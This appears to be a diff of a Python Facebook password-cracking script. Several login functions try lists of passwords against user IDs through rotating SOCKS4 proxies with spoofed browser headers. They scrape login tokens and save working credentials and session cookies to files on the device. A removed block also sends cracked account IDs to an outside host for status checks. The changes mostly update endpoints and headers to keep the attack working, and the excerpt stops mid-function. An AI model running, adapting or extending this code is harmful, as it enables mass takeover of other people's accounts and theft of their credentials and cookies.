@@ -966,24 +966,8 @@ def m2(idf,pwv):
    dataa ={'lsd': re.search('name="lsd" value="(.*?)"',str(p.text)).group(1), 'jazoest': re.search('name="jazoest" value="(.*?)"',str(p.text)).group(1), 'm_ts': re.search('name="m_ts" value="(.*?)"',str(p.text)).group(1), 'li': re.search('name="li" value="(.*?)"',str(p.text)).group(1), 'try_number': '0', 'unrecognized_tries': '0', 'email': idf, 'pass': pw, 'prefill_contact_point': '', 'prefill_source': '', 'prefill_type': '', 'first_prefill_source': '', 'first_prefill_type': '', 'had_cp_prefilled': 'false', 'had_password_prefilled': 'false', 'is_smart_lock': 'false', 'bi_xrwh': re.search('name="bi_xrwh" value="(.*?)"',str(p.text)).group(1)}
    koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
    koki+=' m_pixel_ratio=2.625; wd=412x756'
-   heade={
-            'authority': 'mobile.facebook.com/',
-            'method': 'POST',
-            'path': '/login/device-based/login/async/',
-            'scheme': 'https',
-            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;',
-            'accept-encoding': 'gzip, deflate, br',
-            'accept-language': 'en-US,en;q=0.9',
-            'referer': 'https://m.facebook.com',
-            'sec-ch-ua': '"Google Chrome";v="105", "Not)A;Brand";v="8", "Chromium";v="105"',
-            'sec-ch-ua-mobile': '?0',
-            'sec-ch-ua-platform': '"Windows"',
-            'sec-fetch-dest': 'document',
-            'sec-fetch-mode': 'navigate',
-            'sec-fetch-site': 'same-origin',
-            'upgrade-insecure-requests': '1',
-            'user-agent':'Mozilla/5.0 (Linux; U; Android 4.4.3; en-us; KFASWI Build/KTU84M) AppleWebKit/537.36 (KHTML, like Gecko) Silk/3.68 like Chrome/39.0.2171.93 Safari/537.36',}
-   po = ses.post('https://x.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=100',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
+   heade={'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://m.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://www.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=100','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
+   po = ses.post('https://www.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=100',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
    if "checkpoint" in po.cookies.get_dict().keys():
         idf = ses.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
         if 'y' in cp_xdx:
@@ -1020,29 +1004,32 @@ def m3(idf,pwv):
     try:
       nip=random.choice(proxsi)
       proxs= {'http': 'socks4://'+nip}
-      ses.headers.update({"Host": "m.facebook.com","cache-control": "max-age=0","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","sec-ch-ua": '" Not A;Brand";v="99", "Chromium";v="104"',"sec-ch-ua-mobile": "?1","sec-fetch-site": "same-origin","sec-fetch-mode": "cors","sec-fetch-dest": "empty","sec-fetch-user": "?1","upgrade-insecure-requests": "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
-      p = ses.get("https://m.facebook.com/login.php?skip_api_login=1&api_key=274266067164&kid_directed_site=0&app_id=274266067164&signed_next=1&next=https%3A%2F%2Fm.alpha.facebook.com%2Fv2.7%2Fdialog%2Foauth%3Fapp_id%3D274266067164%26cbt%3D1675237736936%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df33eeedf0d23c74%2526domain%253Did.pinterest.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fid.pinterest.com%25252Ff4c01e9564da44%2526relation%253Dopener%26client_id%3D274266067164%26display%3Dtouch%26domain%3Did.pinterest.com%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fid.pinterest.com%252Flogin%26locale%3Did_ID%26logger_id%3Df27fa04cd920e98%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df96f44d15f7ea8%2526domain%253Did.pinterest.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fid.pinterest.com%25252Ff4c01e9564da44%2526relation%253Dopener%2526frame%253Df7efd9d84b96a8%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26scope%3Dpublic_profile%252Cemail%252Cuser_birthday%252Cuser_friends%26sdk%3Djoey%26version%3Dv2.7%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df96f44d15f7ea8%26domain%3Did.pinterest.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fid.pinterest.com%252Ff4c01e9564da44%26relation%3Dopener%26frame%3Df7efd9d84b96a8%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr")
+      ses.headers.update({"Host": "m.alpha.facebook.com","cache-control": "max-age=0","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","sec-ch-ua": '" Not A;Brand";v="99", "Chromium";v="104"',"sec-ch-ua-mobile": "?1","sec-fetch-site": "same-origin","sec-fetch-mode": "cors","sec-fetch-dest": "empty","sec-fetch-user": "?1","upgrade-insecure-requests": "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
+      p = ses.get("https://m.alpha.facebook.com/login.php?skip_api_login=1&api_key=274266067164&kid_directed_site=0&app_id=274266067164&signed_next=1&next=https%3A%2F%2Fm.alpha.facebook.com%2Fv2.7%2Fdialog%2Foauth%3Fapp_id%3D274266067164%26cbt%3D1675237736936%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df33eeedf0d23c74%2526domain%253Did.pinterest.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fid.pinterest.com%25252Ff4c01e9564da44%2526relation%253Dopener%26client_id%3D274266067164%26display%3Dtouch%26domain%3Did.pinterest.com%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fid.pinterest.com%252Flogin%26locale%3Did_ID%26logger_id%3Df27fa04cd920e98%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df96f44d15f7ea8%2526domain%253Did.pinterest.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fid.pinterest.com%25252Ff4c01e9564da44%2526relation%253Dopener%2526frame%253Df7efd9d84b96a8%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26scope%3Dpublic_profile%252Cemail%252Cuser_birthday%252Cuser_friends%26sdk%3Djoey%26version%3Dv2.7%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df96f44d15f7ea8%26domain%3Did.pinterest.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fid.pinterest.com%252Ff4c01e9564da44%26relation%3Dopener%26frame%3Df7efd9d84b96a8%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr")
       dataa ={'lsd': re.search('name="lsd" value="(.*?)"',str(p.text)).group(1), 'jazoest': re.search('name="jazoest" value="(.*?)"',str(p.text)).group(1), 'm_ts': re.search('name="m_ts" value="(.*?)"',str(p.text)).group(1), 'li': re.search('name="li" value="(.*?)"',str(p.text)).group(1), 'try_number': '0', 'unrecognized_tries': '0', 'email': idf, 'pass': pw, 'prefill_contact_point': '', 'prefill_source': '', 'prefill_type': '', 'first_prefill_source': '', 'first_prefill_type': '', 'had_cp_prefilled': 'false', 'had_password_prefilled': 'false', 'is_smart_lock': 'false', 'bi_xrwh': re.search('name="bi_xrwh" value="(.*?)"',str(p.text)).group(1)}
       koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
       koki+=' m_pixel_ratio=2.625; wd=412x756'
       heade={
-            'authority': 'mobile.facebook.com/',
-            'method': 'POST',
-            'path': '/login/device-based/login/async/',
-            'scheme': 'https',
-            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;',
-            'accept-encoding': 'gzip, deflate, br',
-            'accept-language': 'en-US,en;q=0.9',
-            'referer': 'https://m.facebook.com',
-            'sec-ch-ua': '"Google Chrome";v="105", "Not)A;Brand";v="8", "Chromium";v="105"',
-            'sec-ch-ua-mobile': '?0',
-            'sec-ch-ua-platform': '"Windows"',
-            'sec-fetch-dest': 'document',
-            'sec-fetch-mode': 'navigate',
-            'sec-fetch-site': 'same-origin',
-            'upgrade-insecure-requests': '1',
-            'user-agent':'Mozilla/5.0 (Linux; U; Android 4.4.3; en-us; KFASWI Build/KTU84M) AppleWebKit/537.36 (KHTML, like Gecko) Silk/3.68 like Chrome/39.0.2171.93 Safari/537.36',}
-      po = ses.post('https://x.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
+      "Host": "m.alpha.facebook.com",
+      "content-length": f"{len(str(dataa))}",
+      "x-fb-lsd": re.search('name="lsd" value="(.*?)"',str(p.text)).group(1),
+      "origin": "https://m.alpha.facebook.com",
+      "content-type": "application/x-www-form-urlencoded",
+      "user-agent": ua,
+      "accept": "*/*",
+      "x-requested-with": "com.microsoft.bing",
+      "sec-ch-ua": '"Chromium";v="106", "Google Chrome";v="106", "Not;A=Brand";v="99"',
+      "sec-ch-ua-platform": '"Android"',
+      "sec-ch-ua-mobile": "?1",
+      "sec-fetch-site": "same-origin",
+      "sec-fetch-mode": "cors",
+      "sec-fetch-dest": "empty",
+      "sec-fetch-user": "?1",
+      "referer": "https://m.alpha.facebook.com/v2.7/dialog/oauth?app_id=274266067164&cbt=1675237736936&channel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df33eeedf0d23c74%26domain%3Did.pinterest.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fid.pinterest.com%252Ff4c01e9564da44%26relation%3Dopener&client_id=274266067164&display=touch&domain=id.pinterest.com&e2e=%7B%7D&fallback_redirect_uri=https%3A%2F%2Fid.pinterest.com%2Flogin&locale=id_ID&logger_id=f27fa04cd920e98&origin=2&redirect_uri=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df96f44d15f7ea8%26domain%3Did.pinterest.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fid.pinterest.com%252Ff4c01e9564da44%26relation%3Dopener%26frame%3Df7efd9d84b96a8&response_type=token%2Csigned_request%2Cgraph_domain&scope=public_profile%2Cemail%2Cuser_birthday%2Cuser_friends&sdk=joey&version=v2.7&ret=login&fbapp_pres=0&tp=unspecified",
+      "accept-encoding": "gzip, deflate br",
+      "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
+      }
+      po = ses.post('https://m.alpha.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
       if "checkpoint" in po.cookies.get_dict().keys():
         idf = ses.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
         if 'y' in cp_xdx:
@@ -1069,76 +1056,72 @@ def m3(idf,pwv):
 
 ###----------[  FREE ]----------###
 def m4(idf,pwv):
- global loop
- global ok
- global agents
- animasi = random.choice(["\x1b[1;91mBITHIKA","\x1b[1;92mBITHIKA","\x1b[1;93mBITHIKA","\x1b[1;94mBITHIKA","\x1b[1;95mBITHIKA","\x1b[1;96mBITHIKA","\x1b[1;97mBITHIKA","\x1b[1;91mBITHIKA","\x1b[1;92mBITHIKA","\x1b[1;93mBITHIKA","\x1b[1;94mBITHIKA","\x1b[1;95mBITHIKA","\x1b[1;96mBITHIKA"])
- sys.stdout.write(f'\r{P} [{animasi}{N}-{H}M4{P}] ({B}%s{P}){U}+{H}OK{P}({GREEN}%s{P})'%(loop,ok)),
- try:
-  for ps in pwv:
-   session = requests.Session()
-   pro = random.choice(ugen)
-   free_fb = session.get(f'https://p.facebook.com').text
-   log_data = {
-    "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
-   "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
-   "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
-   "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
-   "try_number":"0",
-   "unrecognized_tries":"0",
-   "email":idf,
-   "pass":ps,
-   "login":"Log In"}
-   header_freefb =  {
-            'authority': 'p.facebook.com/',
-            'method': 'POST',
-            'path': '/login/device-based/login/async/',
-            'scheme': 'https',
-            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;',
-            'accept-encoding': 'gzip, deflate, br',
-            'accept-language': 'en-US,en;q=0.9',
-            'referer': 'https://m.facebook.com',
-            'sec-ch-ua': '"Google Chrome";v="105", "Not)A;Brand";v="8", "Chromium";v="105"',
-            'sec-ch-ua-mobile': '?0',
-            'sec-ch-ua-platform': '"Windows"',
-            'sec-fetch-dest': 'document',
-            'sec-fetch-mode': 'navigate',
-            'sec-fetch-site': 'same-origin',
-            'upgrade-insecure-requests': '1',
-            'user-agent':'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/37.0.2062.94 Chrome/37.0.2062.94 Safari/537.36',} #'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.131 Safari/537.36',
-   lo = session.post('https://p.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
-   log_cookies=session.cookies.get_dict().keys()
-   if 'c_user' in log_cookies:
-    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
-    user = re.findall('c_user=(.*);xs', coki)[0]
-    url = f"https://shishirx.pythonanywhere.com/lock?uid={user}"
-    reqx = requests.get(url).text
-    if 'live' in reqx:
-            print(f'\r\r{P}[ATOM-OK]: {user} | {ps}')
-            print(f"\r\033[38;5;196mCOOKIES=[🤖]: {coki}\33[1;36m")
-            open('/sdcard/ATOM-M4-live-OK.txt','a').write(user+'|'+ps+'|'+coki+'\n')
-            ok+=1 
-            break
-    if 'lock' in reqx:
-            print(f'\r\r{p}[ATOM-OK]: {user} | {ps}')
-            print(f"\r\033[38;5;196mCOOKIES=[🤖]: {coki}\33[1;36m")
-            open('/sdcard/ATOM-M6-live-OK.txt','a').write(user+'|'+ps+'|'+coki+'\n')
-            ok+=1 
-            break
-   elif 'checkpoint' in log_cookies:
-    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
-    coki1 = coki.split("1000")[1]
-    uid = "1000"+coki1[0:11]
-    if 'y' in cp_xdx:
-     print(f'\r{P} [\033[1;30mATOM-CP.txt{P}] \033[1;30m{uid}|{ps}{xxx}')
-    open(' /sdcard/ATOM-CP.txt','a').write(uid+'|'+ps+'|'+'\n')
-    cp.append(uid)
-   else:
-    continue
+  global loop,ok,cp
+  animasi = random.choice(["\x1b[1;91mBITHIKA","\x1b[1;92mBITHIKA","\x1b[1;93mBITHIKA","\x1b[1;94mBITHIKA","\x1b[1;95mBITHIKA","\x1b[1;96mBITHIKA","\x1b[1;97mBITHIKA","\x1b[1;91mBITHIKA","\x1b[1;92mBITHIKA","\x1b[1;93mBITHIKA","\x1b[1;94mBITHIKA","\x1b[1;95mBITHIKA","\x1b[1;96mBITHIKA"])
+  sys.stdout.write(f'\r{P} [{animasi}-{H}M4{P}] ({B}%s{P}){U}+{H}OK{P}({GREEN}%s{P})'%(loop,ok)),
+  sys.stdout.flush()
+  ua = random.choice(usragent)
+  ses = requests.Session()
+  for pw in pwv:
+    try:
+      nip=random.choice(proxsi)
+      proxs= {'http': 'socks4://'+nip}
+      ses.headers.update({"Host": "m.facebook.com","cache-control": "max-age=0","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","sec-ch-ua": '" Not A;Brand";v="99", "Chromium";v="104"',"sec-ch-ua-mobile": "?1","sec-fetch-site": "same-origin","sec-fetch-mode": "cors","sec-fetch-dest": "empty","sec-fetch-user": "?1","upgrade-insecure-requests": "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
+      p = ses.get("https://m.facebook.com/login.php?skip_api_login=1&api_key=2076461462396807&kid_directed_site=0&app_id=2076461462396807&signed_next=1&next=https%3A%2F%2Ffree.facebook.com%2Fdialog%2Foauth%3Fresponse_type%3Dcode%26client_id%3D2076461462396807%26redirect_uri%3Dhttps%253A%252F%252Fduniagames.co.id%252Fnew-callback%26scope%3Dpublic_profile%252Cemail%26code_challenge%3DYqn9YmMbIY9awk-vWUaq_BuuPrndLEOUQXVYSH1Rleo%26code_challenge_method%3DS256%26state%3D2t0u9qzy4ubndt6ek29y6n1obo9mojr%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Dd614149f-136e-431f-babf-db7f365bce91%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fduniagames.co.id%2Fnew-callback%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D2t0u9qzy4ubndt6ek29y6n1obo9mojr%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr")
+      dataa ={'lsd': re.search('name="lsd" value="(.*?)"',str(p.text)).group(1), 'jazoest': re.search('name="jazoest" value="(.*?)"',str(p.text)).group(1), 'm_ts': re.search('name="m_ts" value="(.*?)"',str(p.text)).group(1), 'li': re.search('name="li" value="(.*?)"',str(p.text)).group(1), 'try_number': '0', 'unrecognized_tries': '0', 'email': idf, 'pass': pw, 'prefill_contact_point': '', 'prefill_source': '', 'prefill_type': '', 'first_prefill_source': '', 'first_prefill_type': '', 'had_cp_prefilled': 'false', 'had_password_prefilled': 'false', 'is_smart_lock': 'false', 'bi_xrwh': re.search('name="bi_xrwh" value="(.*?)"',str(p.text)).group(1)}
+      koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
+      koki+=' m_pixel_ratio=2.625; wd=412x756'
+      heade={
+      "Host": "m.facebook.com",
+      "content-length": f"{len(str(dataa))}",
+      "x-fb-lsd": re.search('name="lsd" value="(.*?)"',str(p.text)).group(1),
+      "origin": "https://m.facebook.com",
+      "content-type": "application/x-www-form-urlencoded",
+      "user-agent": ua, #'Mozilla/5.0 (Linux; Android 13; SM-A536B Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.15 Mobile Safari/537.36',
+      "accept": "*/*",
+      "x-requested-with": "com.microsoft.bing",
+      "sec-ch-ua": '"Chromium";v="106", "Google Chrome";v="106", "Not;A=Brand";v="99"',
+      "sec-ch-ua-platform": '"Android"',
+      "sec-ch-ua-mobile": "?1",
+      "sec-fetch-site": "same-origin",
+      "sec-fetch-mode": "cors",
+      "sec-fetch-dest": "empty",
+      "sec-fetch-user": "?1",
+      "referer": "https://m.facebook.com/dialog/oauth?response_type=code&client_id=2076461462396807&redirect_uri=https%3A%2F%2Fduniagames.co.id%2Fnew-callback&scope=public_profile%2Cemail&code_challenge=Yqn9YmMbIY9awk-vWUaq_BuuPrndLEOUQXVYSH1Rleo&code_challenge_method=S256&state=2t0u9qzy4ubndt6ek29y6n1obo9mojr&ret=login&fbapp_pres=0&logger_id=d614149f-136e-431f-babf-db7f365bce91&tp=unspecified",
+      "accept-encoding": "gzip, deflate br",
+      "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
+      }
+      po = ses.post('https://m.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
+      if "checkpoint" in po.cookies.get_dict().keys():
+        idf = ses.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
+        if 'y' in cp_xdx:
+         print(f'\r{P} [\033[1;30mKING-CP{P}] \033[1;30m{idf}|{pw}{xxx}')
+        open(' /sdcard/ULTRA-GREEN-CP.txt','a').write(idf+'|'+pw+'|'+'\n')
+        cp+=1
+        break
+      elif "c_user" in ses.cookies.get_dict().keys():
+        ok+=1
+        coki=po.cookies.get_dict()
+        kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
+        idf = re.findall('c_user=(.*);xs', kuki)[0]
+        print(f'\r{P} [{H}KING-OK{P}] {GREEN}{idf}|{pw}{xxx}')
+        if 'y' in cokix:
+         print(f'\r{gen}{H}'+kuki)
+        open(' /sdcard/ULTRA-GREEN-OK.txt','a').write(idf+'|'+pw+'|'+kuki+'\n')
+        break
+      else:
+        continue
+    except requests.exceptions.ConnectionError:
+      waktu(31)
   loop+=1
-  
- except:
-  pass 
+
+versi_android = random.randint(4,12)
+versi_chrome = str(random.randint(300,325))+".0.0."+str(random.randint(1,8))+"."+str(random.randint(40,150))
+versi_app = random.randint(410000000,499999999)
+device = random.choice(["VOG-L29 Build/HUAWEIVOG-L29","STK-LX3 Build/HUAWEISTK-LX3","BTV-W09 Build/HUAWEIBEETHOVEN-W09","CLT-AL00 Build/HUAWEICLT-AL00","LYA-AL10 Build/HUAWEILYA-AL10","ELE-L29 Build/HUAWEIELE-L29","DIG-AL00 Build/HUAWEIDIG-AL00","EVA-L09 Build/HUAWEIEVA-L09"])
+density = random.choice(["{density=2.0,width=720,height=1208}"])
+ua = f"Dalvik/2.1.0 (Linux; U; Android {versi_android}; {device}) [FBAN/MessengerLite;FBAV/{versi_chrome};FBPN/com.facebook.mlite;FBLC/en_US;FBBV/{versi_app};FBCR/3;FBMF/huawei;FBBD/huawei;FBDV/{device.split(' Build')[0]};FBSV/{str(random.randint(4,10))};FBCA/arm64-v8a:null;FBDM/"+str(density)+";]"
+
 
 ###----------[  MBASIC ]----------###
 
@@ -1153,43 +1136,35 @@ def m5(idf,pwv):
  try:
   for ps in pwv:
    session = requests.Session()
-   #pro = random.choice('Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.53 Mobile Safari/537.36','Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36','Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36','Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/125.0.6422.51 Mobile/15E148 Safari/604.1','Mozilla/5.0 (iPad; CPU OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/125.0.6422.51 Mobile/15E148 Safari/604.1','Mozilla/5.0 (iPod; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/125.0.6422.51 Mobile/15E148 Safari/604.1')
-   free_fb = session.get('https://x.facebook.com').text
+   pro = random.choice(ugen)
+   free_fb = session.get(f'https://m.facebook.com').text
    log_data = {
-             "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
-            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
-            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
-            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
-            "try_number":"0",
-            "unrecognized_tries":"0",
-            "email":idf,
-            "pass":ps,
-            "login":"Log In"}
-   header_freefb = {
-    'authority': 'mbasic.facebook.com',
-    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,/;q=0.8,application/signed-exchange;v=b3;q=0.7',
-    'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
-    'cache-control': 'max-age=0',
-    'content-type': 'application/x-www-form-urlencoded',
-    # 'cookie': 'datr=K8U3ZjyeS7FkMfzQ8xlnsFmv; sb=MsU3Zo_Wb3brwU6zVsNGjAb6; ps_n=1; ps_l=1; m_pixel_ratio=2.75; wd=393x719; fr=0TH2Y8BjlKkgzcnqz..BmN8Uy..AAA.0.0.BmSJy3.AWVZgP5s9t0',
-    'dpr': '2.75',
-    'origin': 'https://mbasic.facebook.com',
-    'referer': 'https://mbasic.facebook.com/',
-    'sec-ch-prefers-color-scheme': 'light',
-    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
-    'sec-ch-ua-full-version-list': '"Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.4"',
-    'sec-ch-ua-mobile': '?1',
-    'sec-ch-ua-model': '"Redmi Note 7 Pro"',
-    'sec-ch-ua-platform': '"Android"',
-    'sec-ch-ua-platform-version': '"10.0.0"',
-    'sec-fetch-dest': 'document',
-    'sec-fetch-mode': 'navigate',
-    'sec-fetch-site': 'same-origin',
-    'sec-fetch-user': '?1',
-    'upgrade-insecure-requests': '1',
-    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
-    'viewport-width': '980',}
-   lo = session.post('https://x.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100',headers=header_freefb,data=log_data).text
+    "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
+   "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
+   "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
+   "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
+   "try_number":"0",
+   "unrecognized_tries":"0",
+   "email":idf,
+   "pass":ps,
+   "login":"Log In"}
+   header_freefb = {'authority':'m.facebook.com',
+            'method': 'POST',
+            'scheme': 'https',
+            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+            'accept-encoding':'gzip, deflate, br',
+            'accept-language': 'en-US,en;q=0.9,en;q=0.8',
+            'cache-control': 'max-age=0',
+            'sec-ch-ua': '"Google Chrome";v="106", "Not)A;Brand";v="99", "Chromium";v="106"',
+            'sec-ch-ua-mobile': '?1',
+            'sec-ch-ua-platform': '"Linux"',
+            'sec-fetch-dest': 'document',
+            'sec-fetch-mode': 'navigate',
+            'sec-fetch-site': 'same-origin',
+            'sec-fetch-user': '?1',
+            'upgrade-insecure-requests': '1',
+            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36'} #'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36',}
+   lo = session.post('https://m.facebook.com/login/device-based/login/async/?',data=log_data,headers=header_freefb).text
    log_cookies=session.cookies.get_dict().keys()
    if 'c_user' in log_cookies:
     coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
@@ -1199,7 +1174,7 @@ def m5(idf,pwv):
     if 'live' in reqx:
             print(f'\r\r{P}[ATOM-OK]: {user} | {ps}')
             print(f"\r\033[38;5;196mCOOKIES=[🤖]: {coki}\33[1;36m")
-            open('/sdcard/ATOM-M5-live-OK.txt','a').write(user+'|'+ps+'|'+coki+'\n')
+            open('/sdcard/ATOM-M6-live-OK.txt','a').write(user+'|'+ps+'|'+coki+'\n')
             ok+=1 
             break
     if 'lock' in reqx:
@@ -1237,20 +1212,16 @@ def m6(idf,pwv):
             #sys.stdout.write(f'\r     {K}[{H}{animasi}{P}/{A}%s{K}]{N}OK{B}>{H}%s'%(loop,len(ok))),
             #sys.stdout.flush()
    pro = random.choice(ugen)
-   free_fb = session.get('https://mobile.facebook.com').text
-   log_data = {
-             "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
